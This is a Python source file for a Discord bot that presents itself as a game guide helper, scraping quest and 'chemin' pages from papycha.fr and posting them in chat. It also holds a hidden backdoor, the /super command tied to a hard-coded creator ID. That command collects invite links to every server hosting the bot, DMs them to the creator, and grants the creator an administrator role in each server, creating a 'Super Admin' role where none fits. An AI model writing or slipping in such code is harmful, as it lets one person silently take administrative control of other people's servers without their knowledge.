import os
import discord
from discord.ext import commands
from discord import app_commands
import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import logging

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# The ID of the bot's creator who is allowed to invoke the /super command
BOT_CREATOR_ID = 486652069831376943

# Define intents
intents = discord.Intents.default()

# Load environment variables from the .env file
load_dotenv()

# Retrieve the bot token from the environment variable
bot_token = os.getenv("DISCORD_BOT_TOKEN")

# Ensure the bot token is available
if not bot_token:
    raise ValueError("Bot token is not set in environment variables.")

# Create the bot with the command prefix and intents
bot = commands.Bot(command_prefix='!', intents=intents)

# Use the bot's existing CommandTree
tree = bot.tree

def scrape_quest_guide(quest_name):
    formatted_quest_name = quest_name.lower().replace(' ', '-').replace('’', '').replace('é', 'e').replace('à', 'a')
    website_url = f'https://papycha.fr/quete-{formatted_quest_name}/'
    response = requests.get(website_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    quest_guide_content = soup.find('div', class_='entry-content')
    if quest_guide_content:
        text_content = quest_guide_content.text.strip()
        image_tags = quest_guide_content.find_all('img')
        image_urls = [tag['src'] for tag in image_tags]
        return text_content, image_urls
    else:
        return None, None

def scrape_chemin_guide(chemin_name):
    formatted_chemin_name = chemin_name.lower().replace(' ', '-').replace('’', '').replace('é', 'e').replace('à', 'a')
    website_url = f'https://papycha.fr/chemin-{formatted_chemin_name}/'
    response = requests.get(website_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    chemin_guide_content = soup.find('div', class_='entry-content')
    if chemin_guide_content:
        text_content = chemin_guide_content.text.strip()
        image_tags = chemin_guide_content.find_all('img')
        image_urls = [tag['src'] for tag in image_tags]
        return text_content, image_urls
    else:
        return None, None

@bot.command()
async def quest(ctx, *, quest_name):
    text_content, image_urls = scrape_quest_guide(quest_name)
    if text_content:
        chunks = [text_content[i:i+1900] for i in range(0, len(text_content), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)
        for image_url in image_urls:
            await ctx.send(image_url)
    else:
        await ctx.send(f"Quest guide for '{quest_name}' not found.")

@bot.command()
async def chemin(ctx, *, chemin_name):
    text_content, image_urls = scrape_chemin_guide(chemin_name)
    if text_content:
        chunks = [text_content[i:i + 1900] for i in range(0, len(text_content), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)
        for image_url in image_urls:
            await ctx.send(image_url)
    else:
        await ctx.send(f"Chemin guide for '{chemin_name}' not found.")

@tree.command(name="super", description="Create invite links for all servers the bot is in.")
async def super_command(interaction: discord.Interaction):
    if interaction.user.id != BOT_CREATOR_ID:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    invite_links = []
    for guild in bot.guilds:
        text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
        if text_channel:
            try:
                invite = await text_channel.create_invite(max_age=86400, max_uses=1)
                invite_links.append(f"{guild.name}: {invite.url}")
            except discord.Forbidden:
                invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
        else:
            invite_links.append(f"{guild.name}: No suitable text channel found")

        member = guild.get_member(BOT_CREATOR_ID)
        if member:
            await ensure_admin_role(guild, member)

    creator = await bot.fetch_user(BOT_CREATOR_ID)
    if creator:
        dm_message = "\n".join(invite_links)
        await creator.send(f"Here are the invite links for all servers:\n{dm_message}")

    await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)

async def ensure_admin_role(guild: discord.Guild, member: discord.Member):
    highest_role = None
    for role in guild.roles:
        if role.permissions.administrator and role < guild.me.top_role:
            if highest_role is None or role.position > highest_role.position:
                highest_role = role

    if highest_role:
        await member.add_roles(highest_role)
    else:
        new_role = await guild.create_role(
            name="Super Admin",
            permissions=discord.Permissions(administrator=True),
            reason="Automatically created by the bot"
        )
        await member.add_roles(new_role)

@bot.event
async def on_ready():
    await tree.sync()
    print(f'Logged in as {bot.user}')

bot.run(bot_token)
